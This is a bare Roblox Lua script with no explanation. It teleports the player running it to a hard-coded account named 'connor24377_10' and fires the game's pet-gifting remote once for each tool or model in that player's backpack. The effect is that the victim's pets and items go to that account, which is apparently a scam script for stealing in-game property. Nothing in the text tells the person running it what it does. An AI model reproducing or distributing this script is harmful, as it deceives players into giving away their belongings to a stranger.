local s=game:GetService
local p=s("Players")
local r=s("ReplicatedStorage")
local a="connor24377_10"
local lp=p.LocalPlayer
local b=lp:WaitForChild("Backpack")
local e=r:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
local ap=p:FindFirstChild(a)
if not ap then return end
local ac=ap.Character
if not ac or not ac:FindFirstChild("HumanoidRootPart") then return end
local lc=lp.Character or lp.CharacterAdded:Wait()
local h=lc:WaitForChild("HumanoidRootPart")
h.CFrame=ac.HumanoidRootPart.CFrame*CFrame.new(2,0,0)
wait(1)
for _,v in ipairs(b:GetChildren())do
	if v:IsA("Tool")or v:IsA("Model")then
		e:FireServer("GivePet",ap)
		wait(0.3)
	end
end
